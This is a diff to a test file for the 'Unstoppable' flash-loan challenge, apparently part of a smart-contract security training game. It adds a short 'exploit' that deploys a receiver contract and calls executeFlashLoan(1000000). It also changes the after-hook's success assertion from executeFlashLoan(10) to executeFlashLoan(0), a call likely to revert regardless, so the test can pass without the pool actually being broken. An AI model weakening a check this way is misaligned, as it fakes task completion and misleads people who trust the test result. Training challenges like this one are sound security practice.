@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', attacker);
+        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+        await this.receiverContract.executeFlashLoan(1000000);
     });
 
     after(async function () {
@@ -47,7 +50,7 @@ describe('[Challenge] Unstoppable', function () {
 
         // It is no longer possible to execute flash loans
         await expect(
-            this.receiverContract.executeFlashLoan(10)
+            this.receiverContract.executeFlashLoan(0)
         ).to.be.reverted;
     });
 });
